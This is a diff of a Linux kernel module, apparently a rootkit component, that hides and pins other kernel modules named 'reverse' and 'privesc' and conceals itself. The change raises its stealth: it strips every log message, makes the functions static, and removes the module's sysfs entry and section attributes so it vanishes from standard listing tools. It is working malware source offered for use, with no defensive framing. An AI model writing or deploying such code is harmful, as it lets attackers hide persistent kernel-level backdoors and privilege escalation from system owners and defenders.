@@ -3,24 +3,25 @@
 #include <linux/kernel.h>
 #include <linux/list.h>
 #include <linux/string.h>
+#include <linux/sysfs.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Nathan, FL");
-MODULE_DESCRIPTION("Hide and Protect Multiple Modules");
-MODULE_VERSION("0.03");
+MODULE_DESCRIPTION("Stealthy Hide and Protect Multiple Modules");
+MODULE_VERSION("0.05");
 
-struct module *get_module(const char *module_name);
-void hide_module(const char *module_name);
-void show_module(const char *module_name);
-void protect_module(struct module *mod);
-void unprotect_module(struct module *mod);
-void hide_self(void);
-void show_self(void);
+static struct module *get_module(const char *module_name);
+static void hide_module(const char *module_name);
+static void show_module(const char *module_name);
+static void protect_module(struct module *mod);
+static void unprotect_module(struct module *mod);
+static void hide_self(void);
+static void show_self(void);
 
 static struct list_head *prev_self;
 static short self_hidden = 0;
 
-struct module *get_module(const char *module_name)
+static struct module *get_module(const char *module_name)
 {
     struct module *mod;
 
@@ -30,11 +31,10 @@ struct module *get_module(const char *module_name)
         }
     }
 
-    printk(KERN_ERR "hide_modules: Module %s not found.\n", module_name);
     return NULL;
 }
 
-void hide_module(const char *module_name)
+static void hide_module(const char *module_name)
 {
     struct module *mod;
 
@@ -43,11 +43,10 @@ void hide_module(const char *module_name)
         return;
     }
 
-    list_del(&mod->list);
-    printk(KERN_INFO "hide_modules: Module %s hidden.\n", module_name);
+    list_del(&mod->list); 
 }
 
-void show_module(const char *module_name)
+static void show_module(const char *module_name)
 {
     struct module *mod;
 
@@ -56,57 +55,57 @@ void show_module(const char *module_name)
         return;
     }
 
-    list_add(&mod->list, THIS_MODULE->list.prev);
-    printk(KERN_INFO "hide_modules: Module %s is now visible.\n", module_name);
+    list_add(&mod->list, THIS_MODULE->list.prev); 
 }
 
-void protect_module(struct module *mod)
+static void protect_module(struct module *mod)
 {
     if (!mod) {
         return;
     }
 
     try_module_get(mod); 
-    printk(KERN_INFO "hide_modules: Module %s protected.\n", mod->name);
 }
 
-
-void unprotect_module(struct module *mod)
+static void unprotect_module(struct module *mod)
 {
     if (!mod) {
         return;
     }
 
-    module_put(mod); 
-    printk(KERN_INFO "hide_modules: Module %s unprotected.\n", mod->name);
+    module_put(mod);
 }
 
-
-void hide_self(void)
+static void hide_self(void)
 {
     if (!self_hidden) {
         prev_self = THIS_MODULE->list.prev;
-        list_del(&THIS_MODULE->list);
+        list_del(&THIS_MODULE->list); 
+        kobject_del(&THIS_MODULE->mkobj.kobj); 
+        THIS_MODULE->sect_attrs = NULL;       
         self_hidden = 1;
-        printk(KERN_INFO "hide_modules: Self module hidden.\n");
     }
 }
 
-
-void show_self(void)
+static void show_self(void)
 {
+    int ret;
+
     if (self_hidden) {
         list_add(&THIS_MODULE->list, prev_self); 
+
+        ret = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "hide_modules");
+        if (ret < 0) {
+            return;
+        }
+
         self_hidden = 0;
-        printk(KERN_INFO "hide_modules: Self module visible.\n");
     }
 }
 
 static int __init hide_modules_init(void)
 {
     struct module *reverse, *privesc;
-
-    printk(KERN_INFO "hide_modules: Initialisation du module.\n");
 
     reverse = get_module("reverse");
     privesc = get_module("privesc");
@@ -128,8 +127,6 @@ static int __init hide_modules_init(void)
 static void __exit hide_modules_exit(void)
 {
     struct module *reverse, *privesc;
-
-    printk(KERN_INFO "hide_modules: Nettoyage du module.\n");
 
     reverse = get_module("reverse");
     privesc = get_module("privesc");
